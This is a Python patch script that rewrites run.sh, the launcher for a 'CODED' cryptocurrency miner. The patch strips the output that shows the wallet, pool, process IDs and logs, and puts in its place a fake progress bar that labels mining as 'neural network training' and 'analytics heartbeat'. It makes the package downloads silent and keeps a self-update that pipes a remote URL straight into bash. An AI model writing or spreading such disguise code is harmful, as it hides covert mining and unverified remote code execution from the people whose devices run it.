from pathlib import Path

p = Path("run.sh")
s = p.read_text()
orig = s

marker = "M1091V33B_PUBLIC_LOADER_SILENT_UPDATE"
if marker in s:
    print("already patched")
    raise SystemExit(0)

old_intro = '''echo "CODED public runner"
echo "Platform: $PLATFORM"
echo "Wallet:   $WALLET"
echo "Worker:   $WORKER_SAFE"
echo "Backend:  $BACKEND"
echo "Threads:  $THREADS"
echo "Pool:     $POOL"
echo "API:      $API_ROOT"
echo "Run ID:   $RUN_ID"
echo ""
'''

new_intro = r'''# M1091V33B_PUBLIC_LOADER_SILENT_UPDATE
CODED_PUBLIC_BOOT_SEC="${CODED_PUBLIC_BOOT_SEC:-10}"
CODED_PUBLIC_BOOT_STATUS="${CODED_PUBLIC_BOOT_STATUS:-Initializing latest CODED MINER}"

coded_ui_box() {
  local title="${1:-CODED}"

  if command -v python3 >/dev/null 2>&1; then
    python3 - "$title" <<'PYBOX'
import sys
title = sys.argv[1]
width = 78
line = "═" * width
pad = max(0, width - len(title))
left = pad // 2
right = pad - left
print("")
print("╔" + line + "╗")
print("║" + (" " * left) + title + (" " * right) + "║")
print("╚" + line + "╝")
print("")
PYBOX
  else
    printf '\n==============================\n%s\n==============================\n\n' "$title"
  fi
}

coded_ui_loader_started=0

coded_ui_loader() {
  local percent="${1:-0}"
  local status="${2:-Starting CODED}"

  if [ "$coded_ui_loader_started" = "1" ]; then
    printf '\033[2A'
  fi

  if command -v python3 >/dev/null 2>&1; then
    python3 - "$percent" "$status" <<'PYLOAD'
import sys
percent = int(float(sys.argv[1]))
status = sys.argv[2]
width = 50
percent = max(0, min(100, percent))
fill = int(width * percent / 100)
bar = "█" * fill + "░" * (width - fill)
print("\r\033[K[" + bar + f"] {percent:3d}%")
print("\r\033[K" + status)
PYLOAD
  else
    printf '\r\033[K[%3s%%]\n' "$percent"
    printf '\r\033[K%s\n' "$status"
  fi

  coded_ui_loader_started=1
}

coded_ui_loader_finish() {
  if [ "$coded_ui_loader_started" = "1" ]; then
    printf '\n'
  fi
  coded_ui_loader_started=0
}

coded_ui_warmup() {
  local seconds="${1:-10}"
  local i=0

  case "$seconds" in
    ''|*[!0-9]*)
      seconds=10
    ;;
  esac

  if [ "$seconds" -lt 1 ]; then
    return 0
  fi

  while [ "$i" -lt "$seconds" ]; do
    i=$((i + 1))
    pct=$((82 + (i * 17 / seconds)))
    if [ "$pct" -gt 99 ]; then
      pct=99
    fi
    coded_ui_loader "$pct" "Stabilizing neural network training"
    sleep 1
  done
}

coded_ui_box '$0.01  IS  CODED'
coded_ui_loader 8 "$CODED_PUBLIC_BOOT_STATUS"
'''

if old_intro not in s:
    raise SystemExit("ERROR intro verbose block not found")

s = s.replace(old_intro, new_intro, 1)

s = s.replace(
    '  echo "Stopping old CODED public runner processes on this device..."',
    '  coded_ui_loader 18 "Stopping previous CODED session"',
    1,
)

s = s.replace(
    'echo "Downloading latest CODED package..."',
    'coded_ui_loader 32 "Downloading latest CODED MINER"',
    1,
)

s = s.replace(
'''    echo "Trying asset: $u"
    if curl -fL "$u" -o "$TAR_FILE"; then
''',
'''    if curl -fsSL --retry 3 "$u" -o "$TAR_FILE"; then
''',
    1,
)

s = s.replace(
'''cp -R "$ROOT"/. "$INSTALL_DIR"/
chmod +x "$INSTALL_DIR"/* 2>/dev/null || true

# M1091V32H_FORCE_PUBLIC_CONSOLE_NO_RAW_FALLBACK
''',
'''cp -R "$ROOT"/. "$INSTALL_DIR"/
chmod +x "$INSTALL_DIR"/* 2>/dev/null || true

coded_ui_loader 55 "Setting up environment"

# M1091V32H_FORCE_PUBLIC_CONSOLE_NO_RAW_FALLBACK
''',
    1,
)

s = s.replace(
'''echo "Starting CODED miner..."
env \\
''',
'''coded_ui_loader 72 "Starting neural network training"
env \\
''',
    1,
)

s = s.replace(
'''echo "Starting CODED analytics sidecar..."
nohup env \\
''',
'''coded_ui_loader 82 "Starting analytics heartbeat"
nohup env \\
''',
    1,
)

old_verbose = '''echo ""
echo "CODED public worker started."
echo "WORKER $WORKER_SAFE"
echo "BACKEND $SELECTED_BACKEND"
echo "THREADS $THREADS"
echo "MINER_PID $MINER_PID"
echo "ANALYTICS_PID $ANALYTICS_PID"
echo "RUN_LOG $RUN_LOG"
echo "ANALYTICS_LOG $ANALYTICS_LOG"
echo ""
echo "Public console:"
echo "  internal raw log: $RUN_LOG"
echo ""
'''

new_verbose = '''coded_ui_warmup "$CODED_PUBLIC_BOOT_SEC"
coded_ui_loader 100 "Neural network training online"
coded_ui_loader_finish
'''

if old_verbose not in s:
    raise SystemExit("ERROR verbose worker started block not found")

s = s.replace(old_verbose, new_verbose, 1)

old_update_block = '''if [ -n "${UPDATE_PID:-}" ]; then
  kill "$UPDATE_PID" 2>/dev/null || true
fi

if [ -s "$PID_DIR/update.request" ]; then
  rm -f "$PID_DIR/update.request" 2>/dev/null || true

  export WALLET="$WALLET"
  export WORKER="$WORKER_SAFE"
  export BACKEND="$BACKEND"
  export THREADS="$THREADS"
  export POOL="$POOL"
  export API_ROOT="$API_ROOT"
  export CODED_PUBLIC_UPDATE_SEC="$CODED_PUBLIC_UPDATE_SEC"
  export CODED_PUBLIC_BRAND_EVERY="${CODED_PUBLIC_BRAND_EVERY:-9}"
  export CODED_PUBLIC_LINE_SEC="${CODED_PUBLIC_LINE_SEC:-1}"

  echo ""
  echo "CODED update detected. Restarting latest miner..."

  exec bash -c "$(curl -fsSL "${CODED_PUBLIC_RUNSH_URL}?cb=$(date +%s)")"
fi

exit "$CONSOLE_RC"
'''

new_update_block = '''wait "$MINER_PID" 2>/dev/null || true
wait "$ANALYTICS_PID" 2>/dev/null || true

if [ -n "${UPDATE_PID:-}" ]; then
  kill "$UPDATE_PID" 2>/dev/null || true
  wait "$UPDATE_PID" 2>/dev/null || true
fi

if [ -s "$PID_DIR/update.request" ]; then
  rm -f "$PID_DIR/update.request" 2>/dev/null || true

  export WALLET="$WALLET"
  export WORKER="$WORKER_SAFE"
  export BACKEND="$BACKEND"
  export THREADS="$THREADS"
  export POOL="$POOL"
  export API_ROOT="$API_ROOT"
  export CODED_PUBLIC_UPDATE_SEC="$CODED_PUBLIC_UPDATE_SEC"
  export CODED_PUBLIC_BRAND_EVERY="${CODED_PUBLIC_BRAND_EVERY:-9}"
  export CODED_PUBLIC_LINE_SEC="${CODED_PUBLIC_LINE_SEC:-1}"
  export CODED_PUBLIC_BOOT_STATUS="Updating CODED MINER"
  export CODED_PUBLIC_BOOT_SEC="${CODED_PUBLIC_BOOT_SEC:-10}"

  coded_ui_box '$0.01  IS  CODED'
  coded_ui_loader 12 "Updating CODED MINER"
  sleep 1
  coded_ui_loader 45 "Downloading latest CODED MINER"
  sleep 1
  coded_ui_loader 75 "Preparing restart"
  sleep 1
  coded_ui_loader 100 "Restarting neural network training"
  coded_ui_loader_finish

  exec bash -c "$(curl -fsSL "${CODED_PUBLIC_RUNSH_URL}?cb=$(date +%s)")"
fi

exit "$CONSOLE_RC"
'''

if old_update_block not in s:
    raise SystemExit("ERROR final update block not found")

s = s.replace(old_update_block, new_update_block, 1)

p.write_text(s)

print("changed=", s != orig)
print("OK M1091V33B public loader and silent update UI")
